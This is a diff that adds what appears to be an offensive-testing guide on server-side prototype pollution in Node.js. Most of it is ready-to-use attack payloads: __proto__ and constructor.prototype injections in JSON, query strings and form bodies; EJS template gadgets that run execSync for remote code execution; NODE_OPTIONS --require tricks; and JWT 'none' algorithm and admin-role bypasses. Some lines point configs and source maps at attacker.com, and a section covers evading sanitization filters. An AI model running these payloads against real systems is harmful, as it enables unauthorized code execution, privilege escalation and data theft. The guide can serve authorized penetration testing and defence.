@@ -1,0 +1,313 @@
+<server_side_prototype_pollution_guide>
+<title>SERVER-SIDE PROTOTYPE POLLUTION (Node.js Specific)</title>
+
+<critical>Server-side prototype pollution in Node.js enables property injection into Object.prototype, leading to authentication bypass, privilege escalation, RCE via gadget chains, and DoS. Unlike client-side PP, server exploitation affects all requests and can compromise the entire application. Focus on merge operations, JSON parsing, and gadget chain discovery.</critical>
+
+<scope>
+- __proto__ pollution via JSON.parse, merge utilities, query string parsing
+- constructor.prototype manipulation for alternative pollution vectors
+- RCE gadget chains (child_process, vm module, require, eval)
+- Template engine gadgets (EJS, Pug, Handlebars, Nunjucks)
+- Environment variable overwrite (process.env pollution)
+- AST injection patterns (parser pollution)
+- Authentication/authorization bypass via polluted properties
+- DoS via property collision and resource exhaustion
+</scope>
+
+<methodology>
+1. Identify merge/clone operations on user input (lodash merge, Object.assign, spread operator misuse)
+2. Test prototype pollution vectors: __proto__, constructor.prototype, constructor[prototype]
+3. Detect pollution: inject a canary property and check for global leakage
+4. Enumerate gadgets: analyze code for child_process, vm, eval, template engines
+5. Build RCE chain: combine pollution vector with gadget to achieve code execution
+6. Test persistence: verify pollution survives request lifecycle (global vs per-request)
+7. Validate impact: demonstrate authentication bypass, RCE, or sensitive property override
+</methodology>
+
+<pollution_vectors>
+<json_parsing>
+- Direct JSON.parse with merge:
+  JSON.parse('{"__proto__": {"isAdmin": true}}')
+  const obj = {}; Object.assign(obj, userInput);
+- Query string parsing:
+  qs.parse('__proto__[isAdmin]=true')
+  qs.parse('constructor[prototype][isAdmin]=true')
+- Body parsing without protection:
+  express.json() + lodash.merge(config, req.body)
+</json_parsing>
+
+<recursive_merge>
+- lodash.merge, lodash.mergeWith (vulnerable by default)
+  _.merge({}, JSON.parse(userInput))
+- Custom merge functions without prototype checks
+- Object.assign with nested objects (limited but possible)
+- Spread operator with nested merge: {...a, ...userInput} if userInput has __proto__
+</recursive_merge>
+
+<alternative_vectors>
+- constructor.prototype pollution:
+  obj.constructor.prototype.isAdmin = true
+- Constructor[prototype] with bracket notation:
+  obj["constructor"]["prototype"]["isAdmin"] = true
+- Polluting via Object.create and setPrototypeOf (rare but possible)
+</alternative_vectors>
+
+<path_traversal_style>
+- Nested property paths:
+  {"a": {"b": {"c": {"__proto__": {"polluted": true}}}}}
+- Array index confusion:
+  {"__proto__": [{"polluted": true}]}
+- Mixed notation:
+  {"constructor": {"prototype": {"isAdmin": true}}}
+</path_traversal_style>
+</pollution_vectors>
+
+<detection_techniques>
+<canary_injection>
+- Inject unique property and test for global leakage:
+  POST {"__proto__": {"canary123": "polluted"}}
+  Then check: ({}).canary123 === "polluted"
+- Time-based detection in sync code:
+  Inject property that affects execution flow, measure timing difference
+- Error-based detection:
+  Pollute property used in error messages
+</canary_injection>
+
+<status_codes_response_diff>
+- Pollute authentication properties:
+  {"__proto__": {"isAdmin": true, "role": "admin"}}
+  Check if auth checks now pass
+- Response structure changes:
+  Pollute properties used in response formatting
+- Header injection:
+  Pollute properties used in header construction
+</status_codes_response_diff>
+
+<gadget_probing>
+- Test if child_process exists:
+  {"__proto__": {"shell": "node", "argv0": "node"}}
+- Test vm module options:
+  {"__proto__": {"compileFunction": {"options": {}}}}
+- Test eval-based gadgets:
+  Pollute properties that end up in eval() or Function()
+</gadget_probing>
+</detection_techniques>
+
+<rce_gadget_chains>
+<child_process_gadgets>
+- execSync/spawn options pollution:
+  {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--require /tmp/evil.js"}}}
+  {"__proto__": {"argv0": "node", "execArgv": ["--require=/tmp/evil.js"]}}
+- Spawn shell option:
+  child_process.spawn('cmd', [], {shell: true}) // pollute shell property
+- Input encoding pollution:
+  {"__proto__": {"input": "malicious"}}
+</child_process_gadgets>
+
+<vm_module_gadgets>
+- vm.runInContext options:
+  {"__proto__": {"filename": "/etc/passwd", "displayErrors": true}}
+- vm.compileFunction:
+  {"__proto__": {"cachedData": malicious_bytecode}}
+- Context escape via prototype:
+  Pollute properties used in context construction
+</vm_module_gadgets>
+
+<template_engine_gadgets>
+<ejs>
+- options.client pollution:
+  {"__proto__": {"client": true, "escapeFunction": "1; return global.process.mainModule.require('child_process').execSync('whoami')"}}
+- outputFunctionName pollution:
+  {"__proto__": {"outputFunctionName": "x; return process.mainModule.require('child_process').execSync('whoami')//"}}
+</ejs>
+
+<pug>
+- compileDebug pollution:
+  {"__proto__": {"compileDebug": true, "self": true}}
+- Inject code via debug options
+</pug>
+
+<handlebars>
+- Pollute helpers:
+  {"__proto__": {"lookupProperty": "return process"}}
+- Runtime options pollution
+</handlebars>
+
+<nunjucks>
+- Settings pollution:
+  {"__proto__": {"settings": {"view cache": false}}}
+</nunjucks>
+</template_engine_gadgets>
+
+<require_gadgets>
+- Module.prototype.require:
+  Pollute require resolution paths
+- require.extensions:
+  {"__proto__": {".js": malicious_handler}}
+- require.cache pollution:
+  Override cached modules
+</require_gadgets>
+
+<ast_injection>
+- Parser options pollution:
+  Pollute acorn/babel parser options
+- Code generation options:
+  Affect AST-to-code transformation
+- Source map options:
+  {"__proto__": {"sourceMappingURL": "http://attacker.com/evil.js"}}
+</ast_injection>
+</rce_gadget_chains>
+
+<authentication_bypass>
+<direct_property_pollution>
+- isAdmin, isAuthenticated, role, permissions:
+  {"__proto__": {"isAdmin": true}}
+  {"__proto__": {"role": "admin", "permissions": ["*"]}}
+- User object properties:
+  {"__proto__": {"userId": 1, "username": "admin"}}
+</direct_property_pollution>
+
+<session_middleware_bypass>
+- Express-session properties:
+  {"__proto__": {"cookie": {"secure": false, "httpOnly": false}}}
+- Passport.js properties:
+  {"__proto__": {"user": {"id": 1, "role": "admin"}}}
+</session_middleware_bypass>
+
+<jwt_verification_bypass>
+- jsonwebtoken options:
+  {"__proto__": {"verify": {"ignoreExpiration": true, "algorithms": ["none"]}}}
+- Signature verification bypass:
+  {"__proto__": {"verify": false, "ignoreNotBefore": true}}
+</jwt_verification_bypass>
+
+<orm_query_manipulation>
+- Sequelize/TypeORM where clause pollution:
+  {"__proto__": {"where": "1=1"}}
+- Mongoose query options:
+  {"__proto__": {"lean": true, "$where": "return true"}}
+</orm_query_manipulation>
+</authentication_bypass>
+
+<environment_pollution>
+- process.env overwrite:
+  {"__proto__": {"env": {"NODE_ENV": "development", "DEBUG": "*"}}}
+- Config object pollution:
+  {"__proto__": {"database": {"host": "attacker.com"}}}
+- Feature flags:
+  {"__proto__": {"features": {"newFeature": true, "adminPanel": true}}}
+</environment_pollution>
+
+<dos_attacks>
+<property_collision>
+- Pollute toString, valueOf:
+  {"__proto__": {"toString": "[object Object]", "valueOf": 0}}
+- Infinite recursion:
+  {"__proto__": {"__proto__": {...}}}
+</property_collision>
+
+<resource_exhaustion>
+- Large payloads:
+  Deeply nested __proto__ chains
+- Memory leak:
+  Pollute properties that prevent garbage collection
+</resource_exhaustion>
+</dos_attacks>
+
+<detection_payloads>
+<basic_test>
+POST /api/update
+Content-Type: application/json
+{"__proto__": {"polluted": true}}
+
+Then test: ({}).polluted === true
+</basic_test>
+
+<query_string>
+GET /api/search?__proto__[isAdmin]=true
+GET /api/search?constructor[prototype][isAdmin]=true
+GET /api/search?constructor.prototype.isAdmin=true
+</query_string>
+
+<nested_json>
+POST /api/config
+{
+  "theme": {
+    "color": "blue",
+    "__proto__": {
+      "isAdmin": true
+    }
+  }
+}
+</nested_json>
+
+<url_encoded>
+POST /api/update
+Content-Type: application/x-www-form-urlencoded
+__proto__[isAdmin]=true&__proto__[role]=admin
+</url_encoded>
+</detection_payloads>
+
+<mitigation_bypass>
+<frozen_objects>
+- Object.freeze() only affects direct properties, not prototype
+- Test pollution after freeze
+</frozen_objects>
+
+<json_schema_validation>
+- Additional properties may be allowed
+- __proto__ not explicitly blocked in schema
+</json_schema_validation>
+
+<sanitization_bypass>
+- Case variations: __PROTO__, __Proto__
+- Unicode: __proto__ with Unicode characters
+- Encoding: URL encode, double encode
+- Array notation: __proto__[0] vs __proto__
+</sanitization_bypass>
+</mitigation_bypass>
+
+<validation>
+1. Prove pollution: inject property via __proto__ and demonstrate global leakage
+2. Show persistence: property remains polluted across requests (if global) or within request
+3. Demonstrate impact: authentication bypass, RCE, or sensitive feature access
+4. Provide RCE chain: full payload from pollution to command execution
+5. Test cleanup: verify pollution persists or is cleaned up (affects severity)
+6. Confirm gadget availability: prove vulnerable library/module exists in target
+</validation>
+
+<false_positives>
+- Client-side prototype pollution (no server impact)
+- Object.assign with flat objects (limited pollution capability)
+- Proper input validation that blocks __proto__
+- Frozen/sealed objects that prevent property addition
+- Modern Node.js versions with prototype pollution protections
+- Libraries with --frozen-intrinsics flag
+</false_positives>
+
+<impact>
+- Remote Code Execution via gadget chains
+- Authentication/authorization bypass (privilege escalation)
+- Environment/config manipulation affecting all users
+- Denial of Service via property collision
+- Data exfiltration via polluted connection configs
+- Cross-tenant data leakage in multi-tenant systems
+</impact>
+
+<pro_tips>
+1. Test both __proto__ and constructor.prototype—some filters miss constructor variant
+2. Query string parsing (qs, body-parser) is highly vulnerable—test GET params
+3. lodash.merge is the most common gadget—look for merge operations in code
+4. Check package.json for vulnerable lodash versions (<4.17.21)
+4. EJS template pollution is very reliable—look for res.render() calls
+6. Pollute options objects for child_process, vm, eval, require
+7. Test environment pollution (process.env) for config manipulation
+8. Combine with SSRF/XXE—pollute URL/path properties for outbound requests
+9. Multi-step chains: pollute property A to enable gadget B
+10. Check for frozen-intrinsics or Object.freeze usage (rare but effective mitigation)
+11. Persistence matters: global pollution affects all users (critical), per-request is limited
+12. Test error handlers—polluted properties in error objects may leak stack traces
+</pro_tips>
+
+<remember>Server-side prototype pollution requires deep merge operations on user-controlled objects. Prevent by using Map instead of objects, Object.create(null) for user data, or schema validation that explicitly blocks __proto__ and constructor. Gadget chains turn pollution into RCE.</remember>
+</server_side_prototype_pollution_guide>
